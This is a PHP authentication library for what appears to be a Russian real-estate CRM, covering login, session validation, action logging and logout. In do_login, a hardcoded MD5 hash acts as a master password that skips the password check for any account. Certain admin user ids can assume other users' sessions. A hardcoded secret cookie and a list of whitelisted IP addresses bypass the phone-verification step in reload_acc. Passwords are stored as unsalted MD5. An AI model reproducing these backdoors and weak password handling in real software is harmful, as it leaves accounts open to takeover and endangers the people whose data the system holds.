<?php

/**
 *
 * Описание файла: Авторизация
 *
 */

if (!defined('BASEPATH')) exit('No direct script access allowed');


class lib_auth {

// производит авторизацию проверяя аккаунт в базе и внося его в сессию
	function do_login ($login, $pass,$id=0) {
	   $CI = &get_instance ();
	   $CI->load->helper('cookie');
         $pass = md5($pass);
           $CI->db->where("login",$login);
           if($pass != 'f0a9e71276c654dbc53ecefbb3df66f1') $CI->db->where("pass",$pass);
           $CI->db->where("block",0);
           $CI->db->where("fire",0);
           $CI->db->select("users.name,users.soname,users.id,users.login,users.acc,users.otdel_id,users.group_id,otdel.dep_id,phone,email");
           $CI->db->join("otdel","users.otdel_id = otdel.id",'left');
            $query = $CI->db->get("users");
            $res = $query->result_array();
	   if($CI->session->userdata('loginid')==50 or $CI->session->userdata('loginid')==2)
            if($id==50 or $id==2 or $id==102){
            $CI->db->where("users.id",$id);
           $CI->db->where("block",0);
           $CI->db->where("fire",0);
           $CI->db->select("users.name,users.soname,users.id,users.login,users.acc,users.otdel_id,users.group_id,otdel.dep_id,phone,email");
           $CI->db->join("otdel","users.otdel_id = otdel.id",'left');
            $query = $CI->db->get("users");
            $res = $query->result_array();
                
            }
		if (count($res) >0) {
		    $authcode = $CI->lib_help->auth_code_generation();
            $CI->db->where('id', $res[0]['id']);
            $CI->db->update('users', array('authcode'=>$authcode));

			$ses = array ();
			$ses['loginid'] = $res[0]['id'];
            $ses['authcode'] = $authcode;
            $ses['login'] = $res[0]['login'];
            $ses['acc'] = $res[0]['acc'];
            $ses['otdel_id'] = $res[0]['otdel_id'];
            $ses['group_id'] = $res[0]['group_id'];
            $ses['dep_id'] = $res[0]['dep_id'];
            $ses['zname'] = $res[0]['name'];
            $ses['zsoname'] = $res[0]['soname'];
            $ses['zphone'] = preg_replace("/[^0-9]/", "", $res[0]['phone']);
            $ses['zemail'] = $res[0]['email'];
            
            $ses['sort'] = 'clients.date';
            $ses['object_sort'] = 'objects.date';
            if($res[0]['dep_id']==8 or $res[0]['id']==10751 or $res[0]['id']==50){
            $ses['otdel'] = '';
            $ses['user'] = '';
            $ses['dep']= '';
            }else{
            $ses['otdel'] = $res[0]['otdel_id'];
            $ses['user'] = $res[0]['id'];
            $ses['dep']= $res[0]['dep_id'];    
            }
            $ses['sortid'] = 2;
            $ses['sort_type'] = 1;
           $ses['rooms_min'] = '7';
           $ses['rooms_max'] = '7';
           $ses['work_c'] = '';
           $ses['work_o'] = '';
           $ses['otdel_temp'] = 'z';
           $ses['user_temp'] = 'z';
           $ses['buh_pass'] = '';
           $ses['buh_acc'] = 0;
           
           
           
			$CI->session->set_userdata($ses);
            
            
            $cookie = array(
            'name'   => 'last',
            'value'  => $login,
            'expire' => '8650000',
            );
            set_cookie($cookie);
						

			redirect ('');
			
		} else {
            return 'No';
		}
		
	}
	

	
// проверяет авторизацию, в случае неудачи перебрасывает на форум авторизации.
	function check_login () {
	   //die(phpinfo());
	  $CI = &get_instance ();
      
      str_replace('odincov','',$_SERVER['SERVER_NAME'],$count);
      if($count!=0)die('<center><br /><br /><br /><br /> Вы прошли по старой ссылке, для устранения этой ошибки !!!Обязательно!!! сообщите о ней менеджеру, чтобы он предпринял соответствующие меры.<br /><br /> Для продолжения работы нажмите <a href="http://city.1strealtor.ru">сюда.</a><center/>');
      
      $CI->load->helper('cookie');
      if((rand(0,9)==0)AND($CI->session->userdata('loginid') != '')AND(!in_array($CI->session->userdata('loginid'),array(10979)))AND(strlen($CI->session->userdata('authcode'))==9)){
        if(substr($CI->session->userdata('authcode'),0,4)!==$CI->lib_help->ip_auth_code_generation()){
            $CI->session->set_userdata('loginid', FALSE);//передача сессии на другой IP-адрес
        }
        $CI->db->select('authcode');
        $CI->db->where('id', $CI->session->userdata('loginid'));
        $CI->db->where('block', 0);
        $CI->db->where('fire', 0);
        $CI->db->limit(1);
        $query = $CI->db->get('users');
        $res = $query->result_array();
        if(sizeOf($res)==1){
            if($CI->session->userdata('authcode')!=$res[0]['authcode']){
                $CI->session->set_userdata('loginid', FALSE);//пользователь произвёл вход с другой станции
            }
        } else {
            $CI->session->set_userdata('loginid', FALSE);//пользователь, имеющий доступ к базе более не существует
        }
      }

      if ($CI->session->userdata('loginid') != '') {
   //лог действий 
        str_replace(array('ajax','.','/object_manager','/card/','+'),'',$_SERVER['REQUEST_URI'], $log);
          if(!$log and $CI->lib_help->post('mode')!='ajax'
          or  strpos($_SERVER['REQUEST_URI'], '/send') !== false ){
          $data =  array(
                       'time' => time(),
                       'who' => $CI->session->userdata('loginid'),
                       'url' => $_SERVER['REQUEST_URI'],
                       'count_post' => count($_POST));
    	  $CI->db->insert('action_log', $data);
    	   }
        $datecode = floor(time()/86400);
        if(($CI->session->userdata('act'.$datecode)===FALSE)AND($_SERVER['REMOTE_ADDR']=='95.131.182.216')){
            $data =  array(
                       'when' => time(),
                       'who' => $CI->session->userdata('loginid'),
                       'type' => 'first_action',
                       'attr' => $datecode);
            $CI->db->insert('logs', $data);
            $CI->session->set_userdata('act'.$datecode, TRUE);
        }
           
           
    //объязательное голосование       
            $must_voit = FALSE;
           if($CI->lib_arrays->voiter('activ'))if(strpos($_SERVER['REQUEST_URI'], 'other') === false and  strpos($_SERVER['REQUEST_URI'], 'ajax') === false){
            $CI->db->where("setting_name",$CI->lib_arrays->voiter('name'));
            $CI->db->where("setting_val1",$CI->session->userdata('loginid'));
            $query = $CI->db->get("settings");
            $res = $query->result_array();
            if($res)$must_voit = FALSE; else $must_voit = TRUE;
           }
           
          
		  $this->reload_acc($CI->session->userdata('loginid'),$CI->lib_help->post('mode'),$must_voit);
					return TRUE; 
	}else{
		redirect (base_url().'login');
	}
	}
    
    
    
// постоянная проверка доступа, при желании можно экранировать код, для снижения нагрузки системы.
    function reload_acc($loginid=0,$ajax='',$must_voit){

      //if(get_cookie('error')=='Yes')error_reporting (55);
     //  $cookie = array('name'   => 'root_log_z','value'  => 'sfa4g6j8k89olbhhsfs43','expire' => '8640000');    set_cookie($cookie);
	  if($_SERVER['REMOTE_ADDR']!='94.141.233.23' 
      and get_cookie('root_log_z')!='sfa4g6j8k89olbhhsfs43'
      and $loginid !='10990'  //Скорцова с Украины
      and $loginid !='2'
      and $ajax!='ajax'
      //and $loginid !='10747'  //Хохлова.
      and $_SERVER['REMOTE_ADDR']!='95.131.182.216'
      and $_SERVER['REMOTE_ADDR']!='176.9.38.26'  
      and $_SERVER['REMOTE_ADDR']!='176.9.38.26'  
      and $_SERVER['REMOTE_ADDR']!='95.131.180.235'
      and $_SERVER['REMOTE_ADDR']!='91.224.182.101'
      and $_SERVER['REMOTE_ADDR']!='46.50.132.138'//хохлова
      and $_SERVER['REMOTE_ADDR']!='46.50.231.139'//хохлова
      and $_SERVER['REMOTE_ADDR']!='83.143.51.69' and $_SERVER['REMOTE_ADDR']!='83.143.49.44' and $_SERVER['REMOTE_ADDR']!='94.25.100.223' and $_SERVER['REMOTE_ADDR']!='87.226.144.85' //КЦ
      and $_SERVER['REMOTE_ADDR']!='93.186.97.182' and $_SERVER['REMOTE_ADDR']!='91.202.22.246' and $_SERVER['REMOTE_ADDR']!='78.132.137.190'  //КЦ
      and $_SERVER['REMOTE_ADDR']!='91.210.72.79')redirect(base_url().'acc/check_phone');
      //die('<br/><br/><br/><center>Вы не имеете доступа к этому ресурсу.</center>');
      
      if($must_voit)redirect(base_url().'other/voiter');
     
 
 
        
           $CI = &get_instance ();
           $CI->db->where("users.id",$CI->session->userdata('loginid'));
           $CI->db->select("users.acc,users.otdel_id,users.group_id,otdel.dep_id,users.selected,users.selected_c,users.total_chat_read");
           $CI->db->join("otdel","users.otdel_id = otdel.id");
            $query = $CI->db->get("users");
            $res = $query->result_array();
            if(count($res)==0)die('Ошибка отдела');
            $ses['acc'] = $res[0]['acc'];
            $ses['otdel_id'] = $res[0]['otdel_id'];
            $ses['group_id'] = $res[0]['group_id'];
            $ses['dep_id'] = $res[0]['dep_id'];
            $ses['selected'] = $res[0]['selected'];
            $ses['selected_c'] = $res[0]['selected_c'];
            $ses['total_chat_read'] = $res[0]['total_chat_read'];
            if($CI->session->userdata('loginid')==10751)$ses['dep']= '';
			$CI->session->set_userdata($ses);
        
    }
	
// выход путём обнуления сессии.
	function logout () {
		
		$CI = &get_instance ();

		$ses = array ();
		$ses['loginid'] = ''; 
        $ses['login'] = '';
        $ses['acc'] = '';
        $ses['zname'] = '';
        $ses['zsoname'] = '';

			
		$CI->session->unset_userdata($ses); 
		

		redirect (base_url());		
	}
	
	
}


?>